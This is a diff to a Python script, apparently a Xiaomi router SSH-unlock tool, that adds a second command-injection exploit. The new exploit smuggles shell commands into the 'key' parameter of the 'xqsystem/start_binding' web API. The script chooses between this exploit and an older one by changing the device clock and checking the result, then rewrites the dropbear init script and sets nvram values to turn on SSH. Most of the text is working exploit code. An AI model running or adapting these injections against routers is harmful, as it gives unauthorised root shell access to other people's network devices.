@@ -3,16 +3,11 @@
 
 import os
 import sys
+import time
 import requests
 
 import xmir_base
 from gateway import *
-
-# Devices:
-# RD01    FW ???
-# RD02    FW ???
-# RD03    FW ???        AX3000T
-# RD08    FW ???        Xiaomi 6500 Pro
 
 
 gw = Gateway(timeout = 4, detect_ssh = False)
@@ -43,7 +38,9 @@ print(f'Current CountryCode = {ccode}')
 
 stok = gw.web_login()
 
-def exec_cmd(cmd = {}, api = 'misystem/arn_switch'):
+
+def exploit_1(cmd = { }, api = 'misystem/arn_switch'):
+    # vuln/exploit author: ?????????
     params = cmd
     if isinstance(cmd, str):
         cmd = cmd.replace(';', '\n')
@@ -51,9 +48,46 @@ def exec_cmd(cmd = {}, api = 'misystem/arn_switch'):
     res = requests.get(gw.apiurl + api, params = params)
     return res.text
 
-res = exec_cmd('logger hello_world_3335556_')
-if '"code":0' not in res:
-    die('Exploit "arn_switch" not working!!!')
+def exploit_2(cmd = { }, api = 'xqsystem/start_binding'):
+    # vuln/exploit author: ?????????
+    params = cmd
+    if isinstance(cmd, str):
+        cmd = cmd.replace(';', '\n')
+        params = { 'uid': 1234, 'key': "1234'\n" + cmd + "\n'" }
+    res = requests.get(gw.apiurl + api, params = params)
+    return res.text
+
+
+# get device orig system time
+dst = gw.get_device_systime()
+
+exec_cmd = None
+exp_list = [ exploit_2, exploit_1 ]
+for exp_func in exp_list:
+    res = exp_func("date -s 203301020304")
+    #if '"code":0' not in res:
+    #    continue
+    time.sleep(1.2)
+    dxt = gw.get_device_systime()
+    if dxt['year'] == 2033 and dxt['month'] == 1 and dxt['day'] == 2:
+        if dxt['hour'] == 3 and dxt['min'] == 4:
+            exec_cmd = exp_func
+            break
+    time.sleep(1)
+
+# restore orig system time
+time.sleep(1)
+gw.set_device_systime(dst)
+
+if not exec_cmd:
+    die('Exploits arn_switch/start_binding not working!!!')
+
+if exec_cmd == exploit_1:
+    print('Exploit "arn_switch" detected!') 
+
+if exec_cmd == exploit_2:
+    print('Exploit "start_binding" detected!') 
+
 
 exec_cmd(r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
 exec_cmd(r"nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit")
